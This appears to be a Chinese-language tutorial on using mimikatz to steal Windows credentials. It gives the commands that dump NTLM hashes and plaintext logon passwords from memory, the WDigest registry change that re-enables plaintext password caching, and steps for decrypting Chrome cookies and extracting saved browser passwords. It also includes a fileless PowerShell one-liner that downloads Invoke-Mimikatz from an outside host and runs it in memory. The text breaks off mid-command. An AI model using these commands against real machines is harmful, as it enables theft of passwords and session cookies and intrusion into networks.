# minilatz使用



#### mimikatz基本使用 <a id="mimikatz-"></a>

以管理员运行后，可以随机打一些字符，进入如下界面

![](https://p408.ssl.qhimgs4.com/t012e4a1adec83a8eef.png)

输入aaa::aaa，可展示所有模块：

![](https://p408.ssl.qhimgs4.com/t017dbeb01a83b4a137.png)

可采用log命令，保存日志

#### 获取hash与明文用户口令 <a id="-hash-"></a>

```text
privilege::debug    
sekurlsa::logonPasswords
```

![](https://p408.ssl.qhimgs4.com/t016361c971300004a2.png)

从 Windows 8.1 和 Windows Server 2012 R2 开始，LM 哈希和“纯文本”密码将不在内存中生成,早期版本的Windows 7/8/2008 R2/2012 需要打 kb2871997 补丁。

这里只抓取到了NTLM

![](https://p408.ssl.qhimgs4.com/t0134784035cd53c350.png)

尝试破解1-CMD5

![](https://p408.ssl.qhimgs4.com/t010463126de57bbaee.png)

尝试破解2-ophcrack [https://www.objectif-securite.ch/ophcrack.php](https://www.objectif-securite.ch/ophcrack.php)

![](https://p408.ssl.qhimgs4.com/t015c667a60d0769037.png)

**修改注册表，启用摘要密码支持**

需要创建UseLogonCredential，并赋值为1

```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)
```

重新登录后，再次运行

![](https://p408.ssl.qhimgs4.com/t016510abc43863eea5.png)

#### 使用mimikatz提取chrome中保存的cookie <a id="-mimikatz-chrome-cookie"></a>

首先把chrome保存cookie的文件拷贝到桌面上方便操作，这个文件在 C:\users\360sec\appdata\local\google\chrome\user data\default\cookies 命令行下拷贝的命令是： Copy 'C:\users\360sec\appdata\local\google\chrome\user data\default\cookies ' c:\users\360sec\desktop

![](https://p408.ssl.qhimgs4.com/t01a02a2d16c27bf4d0.png)

打开桌面上的mimikatz\_trunk文件夹，进入x64文件夹，打开mimikatz.exe

![](https://p408.ssl.qhimgs4.com/t01ec7784cfde966b93.png)

输入dpapi::chrome /in:c:\users\360sec\desktop\cookies /unprotect提取cookie

![](https://p408.ssl.qhimgs4.com/t01f0ca2be2f8390eb3.png)

#### 使用webbrowserpassview获取chrome保存的密码 <a id="-webbrowserpassview-chrome-"></a>

打开桌面上的webbrowserpassview文件夹

![](https://p408.ssl.qhimgs4.com/t01f551af30131fe50c.png)

打开webbrowserpassview.exe

![](https://p408.ssl.qhimgs4.com/t0157decef8d82e865b.png)

#### 使用Powershell版Mimikatz <a id="-powershell-mimikatz"></a>

一句话执行：

```text
powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords full"'
```

无文件执行：

```text
powershell Iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1’);Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords full"'
```

Command 使用法与exe格式相同

```text
Invoke-Mimikatz -Comman
```



